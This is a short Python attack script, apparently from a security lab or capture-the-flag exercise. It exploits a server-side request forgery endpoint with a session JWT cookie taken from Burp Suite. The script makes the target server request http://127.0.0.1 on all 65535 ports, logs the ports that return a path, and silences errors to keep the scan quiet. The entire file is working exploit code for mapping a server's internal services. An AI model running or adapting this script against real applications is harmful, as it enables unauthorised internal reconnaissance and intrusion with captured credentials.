import requests
from tqdm import tqdm
​
# Base URL and endpoint
base_url = "<URL>"
​
# Headers
headers = {
    "Cookie": "jwt=<Cookie from BURPSuite>",
    "Content-Type": "application/json"
}
​
# Function to make POST request to a specific port
def make_request(port):
    test_url = f"http://127.0.0.1:{port}"
    data = {"url": test_url}
​
    try:
        response = requests.post(base_url, headers=headers, json=data)
​
        if response.status_code == 200:
            json_response = response.json()
            if "path" in json_response and json_response["path"]:
                print(f"[+] Port {port} open → Path: {json_response['path']}")
    except requests.RequestException as e:
        pass  # Silence noisy output during fuzzing
​
# Iterate over ports with a progress bar
for port in tqdm(range(1, 65536), desc="Scanning Ports", unit="port"):
    make_request(port)
